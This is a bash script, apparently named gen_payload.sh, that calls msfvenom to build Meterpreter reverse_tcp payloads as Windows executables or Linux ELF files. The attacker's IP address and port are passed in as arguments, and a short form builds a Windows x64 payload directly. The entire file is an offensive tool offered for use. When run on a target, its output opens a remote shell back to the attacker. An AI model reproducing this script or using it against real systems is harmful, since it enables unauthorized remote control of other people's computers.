#!/bin/bash

if [ $# -eq 2 ]
then
	echo -e "Generatign payload...\n"
	msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f exe -o win_pyld.exe
	echo -e "\nDone!"
	exit
fi

if [ $# -ne 4 ]
then
	echo 'Usage: ./gen_payload.sh <platform> <arch> <attacker_IP> <attacker_port>'
	exit
fi

if [ $1 != "windows" ] && [ $1 != "linux" ]
then
	echo -e 'Wrong platform! Available options:\n\tWindows -> windows\n\tLinux -> linux'
	exit
fi

pyld_arch="/${2}"

if [ $1 == "windows" ]
then
	ex_type="exe"
	pyld_name="win_pyld.exe"

	if [ $2 == "x86" ]
	then
		pyld_arch=""
	fi
else
	ex_type="elf"
	pyld_name="lnx_pyld.elf"
fi

if [ $2 != "x86" ] && [ $2 != "x64" ]
then
	echo -e 'Wrong arch! Available options:\n\t32-bit -> x86\n\t64-bit -> x64'
	exit
fi

echo -e 'Generating the payload...\n'

msfvenom -a $2 --platform $1 -p $1$pyld_arch/meterpreter/reverse_tcp LHOST=$3 LPORT=$4 -f $ex_type -o $pyld_name

echo -e '\nDone!'

exit
